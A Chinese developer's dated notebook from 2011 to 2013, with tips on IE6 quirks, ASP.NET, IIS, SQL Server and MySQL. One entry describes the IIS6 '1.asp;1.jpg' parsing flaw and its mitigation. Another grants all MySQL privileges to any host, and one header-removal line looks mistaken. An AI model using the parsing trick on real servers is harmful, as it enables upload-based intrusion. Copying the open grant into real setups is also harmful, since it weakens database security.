+
+2011-11-28
+创建一个Image，当其载入完毕后，可以获取它的width和height。
+不用监听onload事件，直接判断width和height的值即可。IE6/7/8对于缓存的图片，可能不会引发onload事件。
+在IE9中，若将这个image加入到DOM中，然后再移除，则它的width和height将会返回0。所有需要使用width和height时，需要获取它们的值到变量中保存起来。
+
+2011-12-06【重要】
+事务总是在其修改的任何数据上获取排他锁并在事务完成之前持有该锁，不管为该事务设置了什么样的隔离级别。
+对于读取操作，事务隔离级别主要定义保护级别，以防受到其他事务所做更改的影响。
+
+1. 脏读：        当一个事务读取另一个事务尚未提交的修改时，产生脏读;
+2. 不可重复读取: 同一查询在同一事务中多次进行，由于其他提交事务所做的修改或删除，每次返回不同的结果集，此时发生不可重复读取;
+3. 幻读:         同一查询在同一事务中多次进行，由于其他提交事务所做的插入操作，每次返回不同的结果集，此时发生幻读；
+
+System.Data.IsolationLevel中的事务隔离级别解释：
+ReadUncommitted： 指定语句可以读取已由其他事务修改但尚未提交的行;
+允许其他事务执行任何操作；
+
+ReadCommitted:    指定语句不能读取已由其他事务修改但尚未提交的数据。这样可以避免脏读。其他事务可以在当前事务的各个语句之间更改数据，从而产生不可重复读取和幻读。该选项是 SQL Server 的默认设置;
+允许其他事务修改、删除、插入任何行；
+
+RepeatableRead:   对事务中的每个语句所读取的全部数据都设置了共享锁，并且该共享锁一直保持到事务完成为止。这样可以防止其他事务修改当前事务读取的任何行。其他事务可以插入与当前事务所发出语句的搜索条件相匹配的新行。如果当前事务随后重试执行该语句，它会检索新行，从而产生幻读。由于共享锁一直保持到事务结束，而不是在每个语句结束时释放，所以并发级别低于默认的 READ COMMITTED 隔离级别。此选项只在必要时使用;
+允许其他事务修改、删除、插入与当前事务所发出语句的搜索条件不匹配的行，插入与当前事务所发出语句的搜索条件相匹配的新行；
+
+Serializable:     语句不能读取已由其他事务修改但尚未提交的数据。任何其他事务都不能在当前事务完成之前修改由当前事务读取的数据。在当前事务完成之前，其他事务不能使用当前事务中任何语句读取的键值插入新行。范围锁处于与事务中执行的每个语句的搜索条件相匹配的键值范围之内。这样可以阻止其他事务更新或插入任何行，从而限定当前事务所执行的任何语句。这意味着如果再次执行事务中的任何语句，则这些语句便会读取同一组行。在事务完成之前将一直保持范围锁。这是限制最多的隔离级别，因为它锁定了键的整个范围，并在事务完成之前一直保持范围锁。因为并发级别较低，所以应只在必要时才使用该选项；
+允许其他事务修改、删除、插入与当前事务范围锁之外的行；
+
+参考文章：http://blog.csdn.net/niyi0318/article/details/8088602
+
+2011-12-16
+Object.GetHashCode, Object.Equals方法在散列表（例如：IDictionary<TKey,TValue>）中的应用；
+查找一个对象时，若两个对象的GetHashCode返回值相同，这会调用Equals方法再次确定两个对象是否真的相同；
+
+2012-01-15【重要】
+测量字符串的尺寸，可以调用TextRenderer.MeasureText方法。
+
+2012-01-31【重要】
+关于RegExp重复使用exec和test方法的注意事项：
+在每次开始新的检测时，务必设置lastIndex=0，否则可能出现正确和错误依次出现的情况。
+当方法 exec() 或 test() 再也找不到可以匹配的文本时，它们会自动把 lastIndex 属性重置为 0。
+不具有标志 g 和不表示全局模式的 RegExp 对象不能使用 lastIndex 属性。
+
+2012-01-31
+W3C标准定义：
+key event中的keyCode定义按键编码，charCode定义字符编码；
+在keydown和keyup事件中，keyCode为按下/弹起的按键编码，charCode为零；
+在keypress事件中，keyCode为零，charCode为按键产生的字符编码；
+对于Shift/Table等不产生实际字符的按键，不激发keypress事件；
+对于删除键，未定义是否激发keypress事件；
+
+Firefox，Chrome,Safari浏览器支持W3C标准。
+IE的key event只有keyCode属性，在keypress事件中，代替charCode属性。
+Opera(Version <= 11)支持W3C标准事件模型，window对象定义了addEventListener和removeEventListener方法，但key event不支持charCode属性，使用keyCode代替。
+
+2012-02-01
+对于文本输入框，键盘事件的发生顺序如下：
+keydown -> keypress（产生字符的话） -> change -> keyup
+
+2012-02-03
+在Firefox中的Input对象和Button对象 "onclick" in obj ，将会返回false，其他浏览器均返回true。
+
+2012-02-06
+setTimeout()在浏览器执行当前挂起的事件处理句柄并且完成了文档状态更新后，执行指定的函数。
+例如：获取动态元素的offsetWidth，直接调用将返回0，使用下面的代码获取：
+var width = 0;
+window.setTimeout(function() {
+  width = element.offsetHeight;
+},0);
+
+2012-02-06【重要】
+IE6BUG总结：
+1. 浮动元素在浮动方向上的外边距会出现双倍边距BUG。
+解决办法：使用_margin设置一半边距，或，设置浮动元素display:inline。
+
+2. DIV无法覆盖SELECT，z-index属性失效。
+解决办法：IFRAME可以遮挡SELECT，DIV可以遮挡SELECT。
+
+3. 不支持position: fixed定位。
+解决办法：
+a. 使用position: absolute定位
+例如要定位到顶部，CSS如下写：
+_position: absolute;
+_top: expression(eval(document.documentElement.scrollTop+(parseInt(this.currentStyle.marginTop,10)||0)
+例如要定位到底部，CSS如下写：
+_position: absolute;
+_top: expression(eval(document.documentElement.scrollTop+document.documentElement.clientHeight-this.offsetHeight-(parseInt(this.currentStyle.marginBottom,10)||0)))
+b. 使用js处理window的scroll事件；
+
+4. 元素中包含两个浮动元素时，若父元素宽度减去第二个浮动元素的宽度小于3且第二个浮动元素前存在注释且第二个浮动元素HTML标记在同一行中，或，元素中含有type=hidden的input或display: none的div，这会出现文字溢出BUG。
+解决办法：对于第一种情况，宽度差大于3，或，第二个浮动元素HTML标记分行；对于第二种情况，使用一个div包含这个input或div。
+
+5. 子元素相对定位时，父元素的overflow: hidden；将失效；
+解决办法：设置父元素相对定位，并显式设置一个宽度。
+
+6. window的onscroll事件的处理函数会被触发三次；
+注册本窗口的onscroll事件，可以用window.onscroll = function(){} 和window.attachEvent("onscroll", function() {})两种方法；
+若为父窗口注册onscroll事件，除了必须同源外，第一种方法无效，只能使用第二种方法；
+
+2012-02-07
+INPUT file click()方法的支持性：
+1. 正常显示
+Chrome 支持
+Firefox 支持
+Opera 不支持
+IE 支持
+
+2. 隐藏（使用display: none）
+Chrome 不支持
+Firefox 支持
+Opera 不支持
+IE 支持
+
+2. 隐藏（使用visibility: hidden）
+Chrome 支持
+Firefox 支持
+Opera 不支持
+IE 支持
+
+2012-02-07【重要】
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <title></title>
+</head>
+<body style="width: 960px; margin: 10px auto; padding: 0px; border: 1px solid #FF0000;">
+  <div style="width: 316px; height: 60px; margin: 100px 0px; padding: 0px; position: relative; left: 0px; top: 0px; border: 1px solid #000000;">
+    BUG HERE!
+  </div>
+</body>
+</html>
+上面的代码在IE6中存在异常：
+首先使用非最大化的IE6打开页面，然后最大化，会发现DIV错位了。错误原因不清楚。
+解决办法：不要设置body的大小，使用DIV包装整个页面内容。
+
+2012-02-27
+服务器出现错误2219“服务器无法通过系统非页面共享区来进行分配，因为共享区当前是空的。”的原因：程序存在内存泄漏
+解决办法：修改注册表，HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Memory Management
+1. 键值DWORD PoolUsageMaximum，通知内存管理器达到PagedPoolMax的多少百分比后开始整理内存；
+2. 键值DWORD PagedPoolSize，设置为0xFFFFFFFF(-1)，为计算机分配最大页面缓冲池；
+
+2012-03-12
+ASP.NET页面上传到服务器后，访问显示HTTP404（文件不存在）错误；
+解决方法：在IIS的Web服务扩展中查看ASP.NET是否允许；
+
+2012-05-05
+禁用页面滚动条的方法：
+(global.document.documentElement || global.document.body).style.overflow = "hidden";
+若只用 global.document.body.style.overflow = "hidden"; ， 则在使用XHTML DTD的IE6浏览器中无效。
+
+2012-05-11【重要】
+水晶报表的数据源字段不支持Nullable<T>类型；
+
+2012-05-20【重要】
+JavaScript中判断对象是否为数组的方法：
+1. 利用obj instanceof Array来判断：
+   在单一窗口中此方法有效，但在多帧窗口中则失效。例如：在window0中嵌入一个iframe命名为window1，这在window0中调用window1中的方法，并传入一个数组实参，则在window1的方法中该表达式将返回false。
+2. 利用Object.toString()方法的返回值来判断：
+   Object.toString()方法的返回值模式为：[object + 空格 + Class属性的值 +]，而数组类型的Class属性值为Array，故可以通过字符串比对来进行判断。
+   Object.prototype.toString.call(obj) === "[object Array]"，该方法在所有情况下有效。
+
+2012-07-19【重要】
+ASP页面编辑新闻时，出现以下错误：
+Microsoft JET Database Engine 错误 '80004005'
+无当前记录
+
+原因：POST的数据长度超过了IIS的限制；
+解决办法：
+1. 先打开Internet 信息服务(IIS)管理器；
+    (本地计算机 )---- 属性 ----允许直接编辑配置数据库(N)
+2. 在服务里关闭iis admin service服务；
+3. 打开c:\windows\system32\inetsrv\metabase.xml；
+4. 将ASPMaxRequestEntityAllowed把他修改为需要的值；
+5. 重新启动IIS服务；
+
+2012-07-23
+VS2010制作安装文件时，系统必备中没有.NET 2.0的解决办法：
+把C:\Program Files\Microsoft SDKs\Windows\v6.0A\Bootstrapper\Packages\DotNetFX文件夹复制到C:\Program Files\Microsoft SDKs\Windows\v7.0A\Bootstrapper\Packages中；
+
+2012-08-27【重要】
+禁用WinForm窗口右上角关闭按钮的方法：
+重载CreateParams属性，设置ClassStyle |= 0x200;
+
+2012-09-13【重要】
+可以使用sp_executesql来执行动态生成的SQL语句，将输出参数设置为调用脚本中的变量，以便将执行结果返回到调用脚本中；
+
+2012-09-13【重要】
+IIS应用程序池表示运行WEB应用程序的进程配置。
+当“最大进程数”配置为1时，对于每个ASP.NET网站第一个的请求，都会创建一个用于处理所有请求的AppDomain。
+在此AppDomain中，ApplicationState，Cache和Static Class Member都是唯一存在的，这些都可用于ASP.NET缓存。
+当“最大进程数”配置为大于1时，唯一性不复存在。
+
+2012-09-13【重要】
+ASP.NET使用Forms身份验证时，自定义HttpContext.User的方法：
+响应HttpApplication.PostAuthenticateRequest事件，其中的User是一个GenericPrincipal对象。
+1. 若验证成功，则Identity为FormsIdentity对象；
+2. 若验证失败，则Identity为GenericIdentity对象；
+
+2012-09-13
+河南联通直接使用Model上网时，必须使用“宽带我世界”进行连接，下载方式如下：
+1. 创建连接，帐号：cnc@cnc，密码：cnc；
+2. 访问218.29.0.252下载客户端；
+
+2012-09-20
+如果委托中存在ref或out参数，则Lambda表达式参数列表中需要相应的修饰符和显式的参数类型。
+例如委托： delegate void D(ref object returnValue)
+Lambda表达式：(ref object returnValue) => ...
+
+2012-10-09【重要】
+IE6/7中的offsetParent取值Bug。
+对于static定位元素，其offsetParent取离它最近的触发了hasLayout的父元素；
+对于非static定位元素，其offsetParent取离它最近的非static定位的父元素(符合W3C标准)；
+例如：
+<body>
+    <div style="height: 200px;">
+        <input type="button" value="Click" onclick="window.alert(window.document.getElementById('abc').offsetTop);" />
+    </div>
+    <div style="width: 100%;">
+        <div id="abc" style="width: 50px; height: 50px; background-color: #FF0000; float: left;">
+        </div>
+        <div style="clear: both;">
+        </div>
+    </div>
+</body>
+abc的父元素的样式“width: 100%;”在IE中触发了hasLayout，所以IE6/7中点击按钮显示错误(0)，其他浏览器显示正确。
+
+2012-10-09
+关于IE8之前版本的hasLayout属性
+hasLayout是IE特有的一个属性。很多的ie下的css bug都与其息息相关。在ie中，一个元素要么自己对自身的内容进行计算大小和组织，要么依赖于父元素来计算尺寸和组织内容。当一个元素的hasLayout属性值为true时，它负责对自己和可能的子孙元素进行尺寸计算和定位。虽然这意味着这个元素需要花更多的代价来维护自身和里面的内容，而不是依赖于祖先元素来完成这些工作。
+
+下列元素默认 hasLayout=true 
+<table> <td> <body> <img> <hr> <input> <select> <textarea> <button> <iframe> <embed> <object> <applet> <marquee> 
+
+hasLayout属性不能直接设定，你只能通过设定一些特定的css属性来触发并改变 hasLayout 状态。下面列出可以触发hasLayout的一些CSS属性值。 
+------------------------------------- 
+display 
+启动haslayout的值:inline-block 
+取消hasLayout的值:其他值 
+-------------------------------------- 
+width/height 
+启动hasLayout的值：除了auto以外的值 
+取消hasLayout的值：auto 
+--------------------------------------- 
+position 
+启动hasLayout的值：absolute 
+取消hasLayout的值：static 
+---------------------------------------- 
+float 
+启动hasLayout的值：left或right 
+取消hasLayout的值：none 
+--------------------------------------- 
+zoom 
+启动hasLayout的值：有值 
+取消hasLayout的值：narmal或者空值 
+（zoom是微软IE专有属性，可以触发hasLayout但不会影响页面的显示效果。zoom: 1常用来除错，不过 ie 5 对这个属性不支持。） 
+---------------------------------------- 
+writing-mode: tb-rl 
+这也是微软专有的属性。 
+ie7还有一些额外的属性可以触发该属性（不完全列表）： 
+min-height: (任何值) 
+max-height: (任何值除了none) 
+min-width: (任何值) 
+max-width: (任何值除了none) 
+overflow: (任何值除了visible) 
+overflow-x: (任何值除了visible) 
+overflow-y: (任何值除了visible)5 
+position: fixed 
+
+2012-11-1【重要】
+当设置与当前IMG相同的图片地址时，IE6/7/8/9，Firefox都会引发onload事件，但Chrome不引发。
+解决办法；现将图片地址设置为String.Empty，然后再设置成需要的值
+
+2012-11-4
+ASP.NET Page类的ResolveClientUrl和ResolveUri生成正确的资源URL，其中输入的相对地址是相对于代码所在的页或控件，前者生成相对于当前请求地址的URL，后者生成相对于根地址的URL。
+
+2012-11-4【重要】
+浏览器不会执行innerHTML中的脚本和样式；
+
+2012-11-4
+ASP.NET判断用户是否点击了某按钮的方法：
+对于<input type="submit" />，只有用户点击了按钮，它的值才通过表单提交给服务器，HttpRequest.Form才包含它的UniqueID。
+
+2012-11-4
+IE6的BUG：绝对定位的元素，当父元素没有显式设置高度时，height: 100% 将会失效。在IE6下运行下面的代码观察结果。
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title></title>
+</head>
+<body>
+    <div style="position: relative; width: 100px; margin: 10px auto 0px auto; border: 1px solid #777777; overflow: visible;">
+        <div style="width: 100%; height: 200px;">
+        </div>
+        <div style="position: absolute; top: 0px; left: 0px; width: 50%; height: 100%; background-color: #000000;">
+        </div>
+        <div style="position: absolute; top: 0px; right: 0px; width: 50%; height: 100%; background-color: #FF0000;">
+        </div>
+    </div>
+</body>
+</html>
+
+2012-11-5
+自定义鼠标 cursor: url('') 需要注意的事项：
+图片浏览程序中，遮罩图片的翻页元素的自定义鼠标在IE中会被图片元素挡住；
+解决办法是：设置一个非透明的背景色或设置一个空的背景图片（background-image: url('about:blank');）
+
+2012-11-10【重要】
+同一DIV中多个IMG标签横排时，出现间隙的解决方案。
+原代码如下，确保图片存在，则在所有浏览器中image0和image1中会出现明显的空白间隙。
+<body>
+    <div style="width: 100%; text-align: center;">
+        <img id="image0" src="1.jpg" alt="" />
+        <img id="image1" src="2.jpg" alt="" />
+    </div>
+</body>
+解决方案：去掉IMG标签之间的空白。
+<body>
+    <div style="width: 100%; text-align: center;">
+        <img id="image0" src="1.jpg" alt="" /><img id="image1" src="2.jpg" alt="" />
+    </div>
+</body>
+
+IE6中IMG后的空白（包括：回车换行符）会产生一个间隔，代码如下：
+<div style="background-color: #FF0000; margin: 0px; padding: 0px; text-align: center;">
+        <img src="banner.jpg" />
+</div>
+解决办法：去掉IMG标签之后的空白
+
+2012-11-15【重要】
+VB中的注意事项：
+VB不支持串联的赋值语句，因为相等运算符和赋值运算符一样；
+VB中的逻辑运算符不会发生短路；
+VB中的Mid函数中的字符索引是从1开始计数的；
+VB中的Collection类的项索引是从1开始计数的；
+
+2012-11-15【重要】
+若ADO中CommandText中包含不是按行返回查询的命令，则返回的ADODB.Recordset会自动关闭
+例如：执行"INSERT...;SELECT IDENT_CURRENT(tableName);"的话，返回的ADODB.Recordset会自动关闭，从而无法获取到生成的ID值；
+
+2012-11-21
+安装SQL 2008时出现错误："" is not a valid login or you do not have permission
+错误原因：计算机名和当前用户名相同，修改计算机名后安装成功。
+
+2012-12-23【重要】
+在ASP.NET MVC3存在一个BUG，若使用Forms认证，则登录页面总是重定向到~/Account/Login。
+解决方法：在web.config的AppSettings中增加配置：<add key="loginUrl" value="你的登录页面" />
+
+2012-12-24
+遍历ASP.NET的BIN文件夹中应用的程序集的方法：调用BuildManager.GetReferencedAssemblies方法。
+
+2013-01-11【重要】
+IIS6解析漏洞
+1. *.asp文件夹下的所有文件会被当作asp文件执行，例如：www.test.com/1.asp/1.jpg
+2. 形如*.asp;*.jpg的文件会被当作asp文件执行，例如：www.test.com/1.asp;1.jpg
+解决办法：在IIS中配置允许用户上传文件的目录的执行权限为“无”，默认为“纯脚本”。
+
+2013-01-22
+JS中响应keydown事件后，若出现莫名多出的换行符，可通过调用e.preventDefault()方法解决。
+
+2013-02-01
+Access数据类型和.NET数据类型对照表：
+访问类型名称
+
+数据库数据类型
+
+OLEDB 类型
+
+.NET 框架类型
+
+成员名称
+
+文本
+
+VarWChar
+
+DBTYPE _ WSTR
+
+System.String
+
+OleDbType.VarWChar
+
+备忘录
+
+LongVarWCha R
+
+DBTYPE _ WSTR
+
+System.String
+
+OleDbType.LongVarWChar
+
+字节数:
+
+UnsignedTinyInt
+
+DBTYPE _ UI 1
+
+System.Byte
+
+OleDbType.UnsignedTinyInt
+
+是 / 否
+
+Boolean
+
+DBTYPE_BOOL
+
+System.Boolean
+
+OleDbType.Boolean
+
+日期 / 时间
+
+DateTime
+
+DBTYPE _ DATE
+
+System.DateTime
+
+OleDbType.date
+
+货币
+
+十进制
+
+DBTYPE_NUMERIC
+
+System.Decimal
+
+OleDbType.numeric
+
+十进制数:
+
+十进制
+
+DBTYPE_NUMERIC
+
+System.Decimal
+
+OleDbType.numeric
+
+双数:
+
+双
+
+DBTYPE_R8
+
+System.Double
+
+OleDbType.Double
+
+Autonumber （复制 ID）
+
+GUID
+
+DBTYPE_GUID
+
+System.Guid
+
+OleDbType.guid
+
+复制 (ID) 号:
+
+GUID
+
+DBTYPE_GUID
+
+System.Guid
+
+OleDbType.guid
+
+Autonumber （长整型）
+
+整数
+
+DBTYPE_I4
+
+System.Int 32
+
+OleDbType.integer
+
+数量: （长整型）
+
+整数
+
+DBTYPE_I4
+
+System.Int 32
+
+OleDbType.integer
+
+OLE 对象
+
+LongVarBinary
+
+DBTYPE_BYTES
+
+数组 
+System.Byte
+
+OleDbType.LongVarBinary
+
+单个数字：
+
+单个
+
+DBTYPE_R4
+
+System.Single
+
+OleDbType.single
+
+整型数:
+
+SmallInt
+
+DBTYPE_I2
+
+System.Int 16
+
+OleDbType.SmallInt
+
+二进制
+
+VarBinary *
+
+DBTYPE_BYTES
+
+数组 
+System.Byte
+
+OleDbType.binary
+
+超链接
+
+VarWChar
+
+DBTYPE _ WSTR
+
+System.String
+
+OleDbType.VarWChar
+
+2013-02-08【重要】
+js操作table元素的兼容性问题：
+1. IE6/7中，使用table元素的appendChild和insertBefore方法插入tr无效果；
+解决办法：使用tBody元素的方法来插入tr。
+
+2. IE6/7/8/9中，table, tHead, tBody, tFoot, tr元素的innerHTML属性是只读的。
+解决办法：td元素的innerHTML是可读写的，尝试使用td来包装这些元素。
+
+2013-02-17【重要】
+IIS7以上集成模式中，在Application_Start事件中获取HttpContext.Request会引发异常：Request is not available in this context。
+这是因为，在IIS7以上的版本中，第一个请求不再是启动ASP.NET的唯一途径，所以禁止在Application_Start中应用HttpContext.Request。
+解决办法是：可以在Application_BeginRequest中执行与特定请求相关的逻辑。
+
+应用程序回收时，系统将移除Cache中的所有缓存项，如果注册了CacheItemRemovedCallback，则执行其中的代码，最后引发Application_End事件。
+
+2013-02-17
+IE6中，当使用appendChild插入使用其他document创建的节点时，会提示“参数无效”的错误；
+解决办法：不应该插入将其他文档创建的节点，及时其他现代浏览器不提示错误。
+
+2013-02-24【重要】
+IE6中使用Transitional文档类型时，若同时设置td的background-color: transparent和tr的background-color: #FF0000，则tr的样式将不会生效。
+
+2013-02-26【重要】
+ASP.NET MVC模型联编程序映射分层数据模型的方法：
+第一种方法：使用name属性值为“PropertyName[Index].PropertyName”的input元素来提交数据；
+第二种方法：使用HTML帮助方法：HtmlHelper<TModel>.TextBoxFor((model) => model.PropertyName[Index].PropertyName)；
+
+需要注意的是，类似这样的分层数据，MVC框架映射参数值的顺序是，先映射子数据后映射父数据。
+
+2013-03-03【重要】
+WIN 2003 X64的IIS中，站点属性缺失ASP.NET选项卡的解决办法：
+1) Stop the IIS Admin service (and any services that depend on it) via: Start / Control Panel / Administrative Tools / Services.
+2) Make a copy of "MetaBase.xml" at "C:\WINDOWS\System32\inetsrv\".
+3) Open "C:\WINDOWS\System32\inetsrv\MetaBase.xml" in Notepad, or your favorite Text/XML Editor.
+4) Seaarch for and DELETE the line read 'Enable32BitAppOnWin64="TRUE"' - and SAVE the change.
+5) Restart IIS Admin service via the command: Start > Run > "iisreset".
+Open IIS and the ASP.NET Tab should now be present for each site therein.
+
+2013-03-04
+1. ASP.NET运行时报CS0016的错误；
+解决办法：检查系统临时目录(%SYSTEMDRV%/%SYSTEMDIR%/Temp)是否允许IIS_WPG写入。
+
+2013-03-08【重要】
+Delegate.BeginInvoke方法使用ThreadPool中的辅助线程运行委托，对增强ASP.NET的可伸缩性是没有帮助的。
+使用异步文件I/O时，需要指定FileOptions.Asynchronous标志，否则默认实现将调用Delegate.BeginInvoke来执行异步I/O而不是I/O完成端口。
+.Net的默认实现中，文件I/O和网络I/O都是用I/O完成端口来实现异步操作，可以放心使用。
+
+2013-03-25【重要】
+SQL SERVER中备份和还原的权限设置是不同的：
+1. BACKUP DATABASE默认赋予sysadmin和dbcreator固定服务器角色，以及db_owner固定数据库角色；
+1. RESTORE DATABASE默认赋予sysadmin和dbcreator固定服务器角色，db_owner是没有此权限的；
+
+2013-03-25【重要】
+JS中进行数字加减乘除时，有时会出现结尾很多9与正确结果不符的情况。
+原因解释：JS浮点数运算的时候，必须先转化为二进制。如果你的数字转化为二进制后是一个无限循环小数，例如105.01二进制为1101001.00 <00001010001111010111> .......<>里面是循环节，有无限多个，在计算机存储的时候只能舍入。所以浮点数运算一般是近似的；
+解决办法：在可以预测数字最大值的情况下，可以先乘以10的N次幂（例如100）将数字转化为整数，最后再除以10的N次幂得到正确结果；
+
+2013-04-05
+清理SQL SERVER日志的方法：
+1. 将数据库属性设置为简单模式；
+2. 压缩数据库日志文件；
+3. 将数据库属性恢复为1中修改前的属性；
+
+2013-04-10【重要】
+JS中遍历window中用户定义的属性，在FF，Chrome和IE9中直接用for in语句即可，但在IE6/7/8中则无效。
+解决办法：在IE6/7/8中使用for in遍历window.RuntimeObject()函数的返回值。
+
+2013-04-10
+兼容各种浏览器的监听帧（iframe）载入事件的方法是在HTML中定义onload属性，当帧页面地址改变时依然有效；
+
+2013-04-27
+C#中控制成员是否在IntelliSense中显示的方法：使用EditorBrowsableAttribute特性。
+
+2013-05-04【重要】
+SQL SERVER中的唯一约束不支持存在多个NULL值的情况，要实现允许NULL值的唯一约束，有两个解决办法：
+1. SQL SERVER 2008之前的版本：筛选值不为NULL的行，创建绑定到架构的视图，在视图中创建唯一索引；
+2. SQL SERVER 2008之后的版本：在表中创建筛选索引(Filtered Index)；
+
+2013-05-17【重要】
+程序中执行删除目录操作会导致ASP.NET4重启。
+解决方案：添加注册表值HKLM\SOFTWARE\MICROSOFT\ASP.NET: FCNMode DWord:1
+这个注册表值不存在或等于0或大于2表示默认行为：For each subdirectory, the application will create an object that will monitor the subdirectory.
+等于1：The application will disable File Change Notifications (FCNs).
+等于2：The application will create one object to monitor the main directory. The application will use this object to monitor each subdirectory.
+
+2013-05-25【重要】
+CKEditor+CKFinder的配置方法：
+1. 应用ckeditor.js和ckfinder.js
+2. 配置CKEditor，修改config.js，根据实际情况设置CKFinder的路径
+	config.filebrowserBrowseUrl = "/Editor/CKFinder/ckfinder.html";
+	config.filebrowserImageBrowseUrl = "/Editor/CKFinder/ckfinder.html?Type=Images";
+	config.filebrowserFlashBrowseUrl = "/Editor/CKFinder/ckfinder.html?Type=Flash";
+	config.filebrowserUploadUrl = "/Editor/CKFinder/core/connector/aspx/connector.aspx?command=QuickUpload&type=Files";
+	config.filebrowserImageUploadUrl = "/Editor/CKFinder/core/connector/aspx/connector.aspx?command=QuickUpload&type=Images";
+	config.filebrowserFlashUploadUrl = "/Editor/CKFinder/core/connector/aspx/connector.aspx?command=QuickUpload&type=Flash";
+3. 配置CKFinder
+	3.1 修改config.ascx，设置文件上传目录路径
+	BaseUrl = "~/Static/";
+	3.2 修改config.ascx，设置文件按日期分目录存放
+	type = ResourceType.Add( "Files" );
+	type.Url = BaseUrl + string.Format("Files/{0}/{1}/{2}/", today.Year, today.Month, today.Day);
+
+	type = ResourceType.Add( "Images" );
+	type.Url = BaseUrl + string.Format("Images/{0}/{1}/{2}/", today.Year, today.Month, today.Day);
+
+	type = ResourceType.Add( "Flash" );
+	type.Url = BaseUrl + string.Format("Flash/{0}/{1}/{2}/", today.Year, today.Month, today.Day);
+	3.2 修改源文件FileUploadCommandHandler.cs，设置随时间随机文件名
+	sUnsafeFileName = string.Format("{0:HHmmssfff}{1}", DateTime.Now, System.IO.Path.GetExtension(oFile.FileName));
+4. 页面代码
+	//创建CKEditor
+	var editor = CKEDITOR.replace("elementID");
+	//连接CKFinder
+	CKFinder.setupCKEditor(editor, "ckfinderPath");
+	//设置CKEditor值
+	editor.setData("content");
+        //设置CKEditor只读
+	CKEDITOR.on("instanceReady", function(args) {
+		var editor = args.editor;
+		editor.setReadOnly(true);
+	});
+	//获取CKEditor值
+	var content = CKEDITOR.instances["elementID"].getData();
+
+2013-05-26
+<div>
+	<div style="float: left; border: 1px solid #FF0000;">
+		<div style="line-height: 20px;">
+			1234
+		</div>
+	</div>
+</div>
+上面表示自适应宽度的浮动框，若设置最内层div的样式高度，则IE6中它的宽度将会撑满最外层div，导致自适应宽度失败。
+代码如下：
+<div>
+	<div style="float: left; border: 1px solid #FF0000;">
+		<div style="line-height: 20px; height: 30px;">
+			1234
+		</div>
+	</div>
+</div>
+
+2013-05-30【重要】
+动态创建匿名对象的方法：
+通过使用动态语言运行时DLR中的ExpandoObject对象，动态向对象中添加或移除成员；
+
+2013-06-02【重要】
+li漂浮时，ul自适应高度的方法：
+overflow: hidden;
+_zoom: 1;
+
+2013-06-07
+MYSQL没有像SQL SERVER一样的BACKUP DATABASE语句，它的备份还原方法如下：
+备份：mysqldump -uUserName -pPassword databaseName > filePath，例如：mysqldump -uroot -p123 test > e:\database\test.sql
+还原：1. 创建数据库： mysql命令行 --> create database databaseName;
+      2. 选择数据库：use databaseName;
+      3. 还原数据库1：mysql命令行 --> source data.sql;
+         还原数据库2：mysqldump -uUserName -pPassword databaseName < filePath
+
+MYSQL命令行乱码的解决办法：
+使用下面的命令改变当前文本编码：
+set names utf8;
+set names gb2312;
+
+查看MYSQL数据库文本编码的方法：
+show variables like 'character%';
+
+改变MYSQL数据库文本编码为UTF8的方法：
+alter database database_name character set utf8;
+
+MYSQL开启远程访问的方法：创建远程访问账户。
+GRANT ALL PRIVILEGES on *.* TO 'accountNo'@'%' IDENTIFIED BY 'password' WITH GRANT OPTION;
+FLUSH PRIVILEGES;
+
+2013-06-18【重要】
+关于AJAX File Upload的浏览器兼容性：
+IE9之前的版本使用createElement创建iframe对象后，认为它的状态已固定，将忽略对它属性的修改。
+1. IE6/7中设置iframe.name的代码会被忽略，从而导致打开新窗口，解决办法：使用以下的代码创建iframe：document.createElement('<iframe name="randomName">');
+2. IE6/7/8中设置iframe.onload的代码会被忽略，解决办法：监听onload事件；
+
+2013-06-19
+预防DNS劫持，可用的公共DNS列表。
+Google Public DNS: 8.8.8.8, 8.8.4.4
+Open DNS: 208.67.222.222, 208.67.220.220
+114 DNS: 114.114.114.114, 114.114.115.115
+
+2013-06-25
+CSS优先级：
+1. 内联样式 > 内部样式 > 外部样式
+2. 内联样式权重1000 > ID选择器权重100 > 类选择器权重10 > 标签选择器权重1
+
+2013-07-05
+IIS中获取站点ID的方法：HttpRequest.ServerVariables["INSTANCE_ID"]
+
+2013-07-05
+使用C#为站点绑定主机头的方法：
+static void AddHostHeader(string siteID, string ipAddress, int? port, string hostname)
+{
+        using(DirectoryEntry directoryEntry = new DirectoryEntry("IIS://localhost/w3svc/" + siteID)) {
+            PropertyValueCollection bindings = directoryEntry.Properties["ServerBindings"];
+            string header = string.Format("{0}:{1}:{2}", ipAddress, port, hostname);
+
+            if(!bindings.Contains(header)) {
+                bindings.Add(header);
+                directoryEntry.CommitChanges();
+            }
+        }
+}
+
+2013-07-05【重要】
+ASP.NET处理管线中更改IHttpHandler的方法：调用HttpContext.RemapHandler方法。
+ASP.NET编程重启应用程序的方法：调用HttpRuntime.UnloadAppDomain方法。
+
+2013-07-06
+ASP.NET中响应头的处理：
+1. 移除X-AspNet-Version头：<httpRuntime enableVersionHeader="false" />
+2. 移除X-AspNetMvc-Version头：MvcHandler.DisableMvcResponseHeader = false；
+3. 移除X-Powered-By头：在IIS中进行操作；
+
+2013-07-10
+HttpResponse.Charset只设置Content-Type头内容；
+HttpResponse.ContentEncoding设置Content-Type头内容并按此对文本输出流数据进行编码；
+HttpWebRequest.CookieContainer默认为null，表示在整个HTTP通信中禁用Cookie。将它设置为CookieContainer类的实例以开启Cookie；
+HttpWebRequest.Referer必须设置为符合Uri.IsWellFormedUriString()方法的值；
+
+2013-07-12
+获取Uri转义后的绝对地址：Uri.AbsoluteUri；
+获取Uri转义前的地址：Uri.ToString()；
+Uri.EscapeDataString类似于js的encodeURIComponent，编码整个输入字符串；
+Uri.EscapeUriString类似于js的encodeURI，编码输入字符串以便可以作为Uri构造函数的输入；
+
+2013-07-27
+HttpWebRequest发送POST请求时多了一个Expect: 100-continue头，去掉的方法：
+调用：request.ServicePoint.Expect100Continue = false; 或 ServicePointManager.Expect100Continue = false;
+
+2013-08-12
